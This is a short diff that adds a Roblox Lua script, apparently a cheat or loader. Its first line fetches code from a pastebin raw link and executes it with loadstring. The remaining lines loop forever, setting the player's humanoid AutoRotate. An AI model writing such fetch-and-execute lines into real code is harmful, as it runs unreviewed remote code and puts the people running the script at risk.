@@ -1,0 +1,8 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/dC8LbU93'))()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local humanoid = player.Character.Humanoid
+while true do
+    humanoid.AutoRotate = true
+    wait(0)
+end
